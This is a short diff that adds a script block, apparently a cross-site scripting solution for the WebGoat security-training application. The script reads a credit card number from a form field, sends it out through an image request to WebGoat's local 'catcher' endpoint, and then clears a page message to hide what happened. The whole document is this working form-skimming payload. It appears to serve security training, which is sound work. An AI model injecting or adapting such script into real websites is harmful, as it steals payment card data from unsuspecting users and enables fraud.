@@ -1,0 +1,13 @@
+<script>
+	function hack() {
+		var creditCardNumber = encodeURI(document.getElementsByName('field2')[0].value);
+		var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&card=" + creditCardNumber;
+		var XSSImage = new Image();
+		XSSImage.src = url;
+		var message = document.getElementById('message');
+		while (message.firstChild) {
+			message.removeChild(message.firstChild);
+		}
+	}
+	hack();
+</script>
